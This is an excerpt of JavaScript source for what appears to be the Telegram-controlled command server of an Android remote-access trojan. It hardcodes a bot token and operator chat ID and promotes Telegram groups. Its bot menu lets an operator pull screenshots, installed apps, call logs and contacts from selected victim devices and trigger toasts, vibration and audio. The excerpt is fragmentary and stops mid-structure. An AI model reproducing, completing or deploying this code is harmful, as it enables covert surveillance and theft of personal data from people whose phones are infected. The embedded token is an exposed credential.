...
const token = '8075474097:AAF81DW4uS6jD9YGGIkwJLwndiKPvNrXnkE'
const id = '7125184791'
...
app.get('/', function (req, res) {
    res.send('<h1 align="center" style="font-size:18px; color:blue;">❖✙𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮✙❖</h1> <br> <p style="font-size:14px; text-align:center; color:red;">𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗚𝗥𝗨𝗢𝗣➩ @KULDEEP_PAPA</p>')
})
    ...
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                ...
                '• 📣𝗙𝗶𝗿𝘀𝘁 𝗝𝗼𝗶𝗻 👉 @JALLADxBAAP \n\n' +
                '• 🌺𝗠𝗮𝗶𝗻 𝗢𝘄𝗻𝗲𝗿👉 @JALLADxBAAP \n\n' +
                '• 🧭𝗠𝗮𝗶𝗻 𝗚𝗿𝘂𝗼𝗽👉 @JALLADxBAAP \n\n' +
    ...
    if (commend == 'device') {
        appBot.editMessageText(`°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙘𝙤𝙢𝙢𝙚𝙣𝙙 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            ...
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: '𝗔𝗣𝗣𝗦', callback_data: `apps:${uuid}`},
                    ...
                    [
                        {text: '𝗦𝗖𝗥𝗘𝗘𝗡𝗦𝗛𝗢𝗧', callback_data: `screenshot:${uuid}`},
                    ...
                    [
                        ...
                        {text: '𝗧𝗢𝗔𝗦𝗧', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: '𝗖𝗔𝗟𝗟 𝗟𝗢𝗚𝗦', callback_data: `calls:${uuid}`},
                        {text: '𝗖𝗢𝗡𝗧𝗔𝗖𝗧𝗦', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: '𝗩𝗜𝗕𝗥𝗔𝗧𝗘', callback_data: `vibrate:${uuid}`},
                    ...
                    [
                        ...
                        {text: '𝗦𝗧𝗢𝗣 𝗔𝗨𝗗𝗜𝗢', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
